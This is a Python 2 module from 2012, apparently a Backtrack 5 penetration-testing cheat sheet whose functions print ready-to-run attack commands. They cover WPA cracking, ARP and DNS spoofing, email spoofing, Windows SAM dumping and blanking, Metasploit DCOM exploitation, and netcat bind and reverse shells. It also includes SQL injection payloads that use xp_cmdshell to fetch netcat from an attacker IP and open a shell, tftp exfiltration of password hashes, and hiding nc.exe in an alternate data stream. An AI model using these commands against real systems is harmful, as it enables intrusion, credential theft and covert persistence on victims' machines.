'''
Programmer: q0m	
Date: March 28, 2012
Backtrack Command Wrapper
Takes away everything you need to memorize and helps you concentrate on theory
by wrapping everything up into modules that are easily referenced

NOTE: This module is apart of the PENTRN_Artillery collection.  
PENTRN Artillery Collection includes:
        hive.py
        nethawk.py
        remote.py (goldstien)
        manipy.py
        atax.py
        sweetcli.py

              __                                        
       __    /\ \                                       
  ____/\_\   \_\ \     __     __     _ __    ___ ___    
 /',__\/\ \  /'_` \  /'__`\ /'__`\  /\`'__\/' __` __`\  
/\__,S`\ \ \/\ \T\ \/\  __//\ \F\.\_\ \ \/I/\ \/\ \/\M\ 
\/\____/\ \_\ \___,_\ \____\ \__/. \_\\ \_\ \ \_\ \_\ \_\\
.\/___/  \/_/\/__,_ /\/____/\/__/\/_/ \/_/  \/_/\/_/\/_/
     Module for Backtrack 5 and Penetration Testing
         Support the Free Information Movement


Administrative tasks:            admin()
Cracking(Passwords/Keys):        passwords()
Network attacks:                 attacks()
Windows attacks:                 winattacks()
Network config:                  netconfig()
Netcat tricks:                   netcat()
sample_pen_test()                sample pen test steps
---
'''

def index():
	for item in dir(sidearm):
		print item


def index():
	from sidearm import *
	print "\n"
	print "Administrative tasks:            admin()"
	print "Cracking(Passwords/Keys):        passwords()"
	print "Network attacks:                 attacks()"
	print "Windows attacks:                 winattacks()"
	print "Network config:                  netconfig()"
	print "Netcat tricks:                   netcat()"
	print "sample_pen_test()                sample pen test steps"

from sidearm import *
def admin():
	print "\n"
	print "add_an_autostart                 add an autostart file or script to backtrack"
	print "hide_nc_in_txt                   hide nc in a notepad: alternate data streams"
	print "mount_harddrives                 mount a HD"
	print "compile_program                  compile a C program"
	print "unpack_tarball                   unpacking a tarball and installing a prog"

def passwords():
	print "\n"
	print "cracking_pw_jtr                  crack a password with jack the ripper"
	print "cracking_pw_rt                   crack a password with rcrack"
	print "cracking_wpa_psk                 crack a wpa psk password"
	print "pw_bruteforce                    bruteforce a password"

def attacks():
	print "\n"
	print "arp_spoofing                     perform an arp spoof "
	print "dns_spoofing                     perform a dns spoof within a local segment"
	print "spoofing_emails                  mail server config: spoof an email"
	print "sql_injection                    sql injection quick ref"
	print "wget_browser_spoof               (unknown)"
	print "follow_browser_mitm              (unknown)"

def winattacks():
	print "\n"
	print "dump_the_sam                     dump a windows sam file"
	print "dumping_hashes                   dump hashes from a windows system"
	print "modify_sam_file                  modify a windows SAM file"
	print "post_privilege_escal             post compromise(win): privilege escalation"
	print "post_tftp                        post compromise: file transfer "

def netconfig():
	print "\n"
	print "check_for_wifi                   check the area for wifi APs and networks"
	print "connect_via_wireless             connect to a wireless access point"

def _netcat():
	print "nc_bind_shell                    NC: create a bind shell "
	print "nc_chat_session                  NC: start a chat session "
	print "nc_file_transfer                 NC: perform a file transfer"
	print "nc_portscan                      NC: perform a portscan"
	print "nc_reverse_shell                 NC: reverse shell"


#########################################################################################################
#####################################  INSTRUCTION SET STARTS HERE  #####################################

def cracking_wpa_psk():
	print "\n"
	print "iwconfig"	
	print "	 (checking wireless interfaces)"
	print "airmon-ng"
	print "	 (checking monitoring mode)"
	print "airmon-ng start interface"			
	print "  (activate monitoring mode)"
	print "airodump-ng --encrypt wpa interface"
	print "	 (list all access points using wpa-psk)"
	print "airodump-ng --write sniff.cap --channel 11 --bssid xx:xx --encrypt wpa interface 			"
	print "	 (sniff the channel and log the result in a capture file)"
	print "aireplay-ng -0 1 -a BSSID -c station MAC interface 			"
	print "	 (force disconnection of the station and catch the handshake)"
	print "aircrack-ng sniff.cap 					"
	print "	 (check out to see if handshake capture)"
	print "aircrack-ng -c yourcapfile.cap -w yourwordslist.txt"
	print "	 (cracking)"
	

def connect_via_wireless():
	print "\n"
	print "sudo iwconfig eth1 mode managed essid BTHomeHub-6EE6 key 3d357f1954"
	print "ifconfig eth1"
	print "sudo dhclient eth1"


def mount_harddrives():
	print "\n"
	print "sudo mount -t ntfs-3g /dev/sdb1 /mnt/BACKUP"
	print "sudo mount /dev/sda1 /mnt/WIN"
	print "mount /dev/scd1 /mnt/cdrom"
	

def add_an_autostart():
	print "\n"
	print "cd /root/.kde3/Autostart"
	print "ln -s /usr/bin/leetmode"
	
def check_for_wifi():
	print "\n"
	print "dmesg | egrep 'rtl | wlan'"

def follow_browser_mitm():
	print "\n"
	print "sudo ettercap -T -Q -M arp:remote -i eth1 /192.168.1.66/ // -P remote_browser"
	print ""
	print "the -T starts it in text mode."
	print "the -Q will make ettercap be superQuiet (not print raw packets in the terminal window)"
	print "the -M starts man in the middle mode, and the arp:remote is the type of poisoning, and remote is a parameter for"
	print "MITM. these commands can be combined into one switch like -TQM but for clarity i put them separately."
	print "the -i eth1 specifies the network interface and is optional, if you have only one network interface it is probably not"
	print "needed. in this case, i was on a laptop using a wifi connection to my AP. this works just as good as a wired connection,"
	print "and takes no other preparation other than being properly associated with the access point."
	print "the /192.168.1.66/ is the victim ip and // means 'the rest of the segment'. i tried it without the // in hopes that it wouldn't"
	print "have to poison the whole segment, but it didn't seem to work. i know that using ettercap in other ways you can single"
	print "out one machine without making a lot of noise on the network."
	print "the -P remote_browser is the plugin to follow the victim browser"
	
	
def wget_browser_spoof():
	print "\n"
	print "wget -U 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.6) Gecko/20070802 SeaMonkey/1.1.4'"
	print "http://yourURL.com"
	print "nc -l -p 8000 -v; now, in your browser, go to 'http://localhost:8000'"
	

def spoofing_emails():
	print "\n"
	print "/etc/init.d/sendmail start"
	print "sendEmail -f 123@123.com -m welcome to the matrix -t napoleon182@interia.pl"
	print "sendEmail -f xxxx1@gmail.com -t xxxxx2@mailinator.com -u testsubject -m testmessage -s smtp.gmail.com:465 -o tls=yes -xu xxxxx3 -xp ****(password) //if port is no good, try 587"
	
def compile_program():
	print "\n"
	print "gcc -o newname exploit.c"
	print "gcc -o dcom 66.c"
	print "./dcom"
	
def unpack_tarball():
	print "\n"
	print "tar zxvf program.tar.gz"
	print "cd to the new program folder method 2: bzip2 -cd program.tar.bz2 | tar xvf -"
	print "./configure"
	print "make"
	print "su root"
	print "make install"
	
def arp_spoofing():
	print "\n"
	print "nano /usr/local/etc/etter.conf"
	print "Under the Linux section, uncomment both lines under iptables."
	print "Sniff > Unified sniffing > Network interface: eth0 > OK"
	print "Hosts > Scan for hosts (do this two times)"
	print "Hosts > Hosts list"
	print "Select the default gateway > Add to Target 1"
	print "Select the target > Add to Target 2"
	print "Mitm > Arp poisoning > Sniff remote connections > OK"
	print "Start > Start sniffing"
	print "dsniff -i eth0"
	print "urlsnarf -i eth0"
	print "msgsnarf -i eth0"
	print "driftnet -i eth0"

def dns_spoofing():
	print "\n"
	print "nano /usr/local/share/ettercap/etter.dns"
	print "Edit the Microsoft lines (target URL) to redirect to the attacker."
	print "Plugins > Manage the plugins > dns_spoof"
	print "Mitm > Arp poisoning > Sniff remote connections > OK"
	print "Start > Start sniffing"

def post_privilege_escal():
	print "\n"
	print "After gaining a remote shell, run this shizzle"
	print "hostname"
	print "net users"
	print "net user x hack /add"
	print "net user x /add"
	print "net localgroup"
	print "net localgroup administrators"
	print "net localgroup administrators x /add"
	
def post_tftp():
	print "\n"
	print "attack box 10.1.1.2"
	print "cp /pentest/windows-binaries/tools/nc.exe /tmp/"
	print "target box"
	print "tftp -i 10.1.1.2 GET nc.exe"
	print "TFTP copies files with read only attributes. So to delete the file:"
	print "attrib -r nc.exe"
	print "del nc.exe"

def nc_portscan():
	print "\n"
	print "nc -v -z 10.1.1.2 1-1024"

def nc_chat_session():
	print "\n"
	print "target: nc -lvp 4444"
	print "attacker: nc -v 10.1.1.2 4444"

def nc_file_transfer():
	print "\n"
	print "target: nc -lvp 4444 > output.txt"
	print "attacker: nc -v 10.1.1.2 4444 < test.txt"
	
def nc_bind_shell():
	print "\n"
	print "target: nc -lvp 4444 -e cmd.exe  //should be sitting at the command prompt of the target"
	print "attacker: nc -v 10.1.1.2 4444"
	
def nc_reverse_shell():
	print "\n"
	print "target: nc -lvp 4444"
	print "attacker: nc -v 10.1.1.2 4444 -e /bin/bash"
	

def pw_bruteforce():
	print "\n"
	print "zcat /pentest/password/dictionaries/wordlist.txt Z > words"
	print "FTP BRUTEFORCE		hydra -l ftp -P wordfile -v <targetIP> ftp"
	print "POP3 BRUTEFORCE		hydra -l muts -P wordfile -v <targetIP> pop3"
	print "SNMP BRUTEFORCE 		hydra -P wordfile -v <targetIP> snmp"
	print "MSVPN BRUTEFORCE		nmap -p1723 <targetIP>"
	print "                     dos2unix wordfile"
	print "                     cat wordfile | thc-pptp-bruter <targetIP>"
	
def dump_the_sam():
	print "\n"
	print "Normal SAM Location:"
	print "%SYSTEMROOT%/system32/config"
	print "%SYSTEMROOT%/repair backup copy not locked by the OS"
	print ""
	print "bkhive /mnt/sda1/WINDOWS/system32/config/system system.txt"
	print "samdump2 /mnt/sda1/WINDOWS/system32/config/sam system.txt > hash.txt"
	print "cat hash.txt"
	
def modify_sam_file():
	print "\n"
	print "chntpw /mnt/sda1/WINDOWS/system32/config/SAM"
	print "Blank the password. *"
	print "Do you really wish to change it? y"
	print "Write hive files? y"
	print "unmount /mnt/sda1"
	print "reboot"
	


def dumping_hashes():
	print "\n"
	print "./msfcli exploit/windows/dcerpc/ms03_026_dcom RHOST=targetIP PAYLOAD=windows/meterpreter/bind_tcp E"
	print "meterpreter > upload -r /tmp/pwdump6 c:\\windows\\system32\\"
	print "meterpreter > execute -f cmd -c"
	print "meterpreter > interact x where x is Channel created."
	print "C:\WINDOWS\system32> pwdump \\127.0.0.1"
	
def cracking_pw_jtr():
	print "\n"
	print "Paste the hashes into a new file."
	print "nano hash.txt"
	print "Delete unneeded accounts."
	print "cp hash.txt /pentest/password/john-1.7.2/run/"
	print "cd /pentest/password/john-1.7.2/run/"
	print "./john hash.txt"
	
def cracking_pw_rt():
	print "\n"
	print "rcrack *.rt -f hash_file.txt"
	
def mount_ntfs_share():
	print "\n"
	print "Boot your box with Backtrack."
	print "mount"
	print "umount /mnt/hda1"
	print "modprobe fuse"
	print "ntfsmount /dev/hda1 /mnt/hda1"
	print "mount"
	print "ls -l /mnt/hda1"
	
def sql_injection():
	print "\n"
	print "Locate Oracle Boxes: nmap -sS -p 1521 targetIP"
	print "Locate MSSQL Boxes: nmap -sS -p T:1433,U:1434 targetIP"
	print "Authentication Bypass: 				' or 1=1--"
	print "Enumerate Table Names:				' having 1=1--"
	print "                                     ' group by table having 1=1--"
	print "                                     ' group by table, table2 having 1=1--"
	print "                                     ' group by table, table2, table3 having 1=1--"
	print "Enumerate Column Types:                union select sum(column) from table --"
	print "                                       union select sum(column2) from table --"
	print "Adding Data:                         ' ; insert into table values('value','value2','value3')--"
	print "MSSQL Stored Procedure::             ' ; exec sp_makewebtask \"c:\Inetpub\wwwroot\test.html\", \"select * from table\" ; --"
	print "Execute ipconfig:                    ' or 1=1; exec master..xp_cmdshell ' \"ipconfig\" > c:\Inetpub\wwwroot\test.txt' ;--"
	print "Upload nc and spawn rshell:          ' or 1=1; exec master..xp_cmdshell ' \"tftp -i attackIP GET nc.exe && nc.exe attackIP 53 -e cmd.exe\' ; --"
	print "                                     attacker: nc -lvp 53"
	
	
def hide_nc_in_txt():
	print "\n"
	print "Hide netcat inside a text file. Note netcat must be located in the current directory."
	print "echo \"This is a test\" > test.txt"
	print "type nc.exe > test.txt:nc.exe"
	print "del nc.exe"
	print "start ./test.txt:nc.exe"


def sample_pen_test():
	print "\n"
	print "nslookup"
	print "set type=ns"
	print "set type=mx"
	print "nmap -sS"
	print "nmap -sU"
	print "nc -v target.com 23"
	print "snmpenum"
	print "Solarwinds"
	print "tftp the router config file"
	print "Use a perl script to decrypt the passwords"
	print "Find internal mail server in config file."
	print "nc -n internalserver.com 80"
	print "Edit config file to open more port on the router, 135,139,445,1000"
	print "Use Metasploit to send RPC exploit"
	print "tftp -i attackIP GET pwdump4.exe"
	print "pwdump4.exe \\127.0.0.1>hashes.txt"
	print "tftp -i attackIP PUT hashes.txt"
	print "Crack hashes with rainbow table."
	print "Use Remote Desktop to connect to server.	"
	
	

print __doc__
if __name__=="__main__":	
	from sidearm import *
	print "\n"
	print "              __                                         "
	print "       __    /\ \                                       "
	print "  ____/\_\   \_\ \     __     __     _ __    ___ ___    "
	print " /',__\/\ \  /'_` \  /'__`\ /'__`\  /\`'__\/' __` __`\   "
	print "/\__,S`\ \ \/\ \T\ \/\  __//\ \F\.\_\ \ \/I/\ \/\ \/\M\    "
	print "\/\____/\ \_\ \___,_\ \____\ \__/.\_\\ \_\ \ \_\ \_\ \_\ "
	print " \/___/  \/_/\/__,_ /\/____/\/__/\/_/ \/_/  \/_/\/_/\/_/     "
	print __doc__
